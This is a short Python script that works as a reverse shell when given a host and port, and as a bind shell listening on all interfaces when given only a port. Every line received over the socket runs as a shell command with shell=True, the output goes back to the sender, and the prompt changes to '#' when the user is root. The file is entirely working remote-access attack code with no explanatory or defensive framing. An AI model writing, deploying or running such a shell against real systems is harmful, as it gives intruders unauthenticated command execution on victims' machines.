import socket
import os
import sys
import subprocess

r=subprocess.check_output('whoami',stderr=subprocess.STDOUT,shell=True)
if r==b'root\n':
    w=b'#'
    m=b'sh: full control in this shell\n'
else:
    w=b'$'
    m=b'sh: limited access in this shell\n'

def sh(s):
    s.send(m)
    while 1:
        s.send(b'sh-1.0%s ' % w)
        d=''
        while 1:
            p=s.recv(1024)
            d+=p.decode()
            if len(p) < 1024: break
        try:
            o=subprocess.check_output(d,stderr=subprocess.STDOUT,shell=True)
        except:
            o=b'sh: command not found\n'
        s.send(o)
        if d.replace('\n','')=='exit':
            s.send(b'exit')
            break
        elif d.replace('\n','')[:2]=='cd':
            try:
                os.chdir(d.replace('\n','')[3:])
            except:
                pass

def re(h,p):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect((h,int(p)))
        print('Connected from 0.0.0.0 to [%s] %s' % (h,p))
    except:
        print('Connect failed to %s port %s' % (h,p))
        quit()
    sh(s)

def bd(p):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.bind(('0.0.0.0',int(p)))
        s.listen(5)
        print('Listening on %s ...' % p)
        c,a=s.accept()
        print('Connected from %s to [0.0.0.0] %s' % (a[0],p))
        sh(c)
    except:
        quit()

if len(sys.argv)==3:
    re(sys.argv[1],sys.argv[2])
elif len(sys.argv)==2:
    bd(sys.argv[1])
else:
    print('Invalid agruments')
